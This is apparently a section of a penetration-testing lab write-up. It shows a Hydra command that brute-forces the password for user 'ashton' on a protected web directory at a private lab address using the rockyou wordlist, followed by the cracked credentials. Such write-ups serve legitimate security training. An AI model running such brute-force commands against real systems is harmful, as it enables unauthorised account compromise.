### BRUTE FORCE ATTACK

Using Ashton's name, run the Hydra attack against the directory:

* hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder

* hydra was successfull at getting the correct login and password:

    - Login: ashton
    - Password: leopoldo 

![pic](4.PNG) 












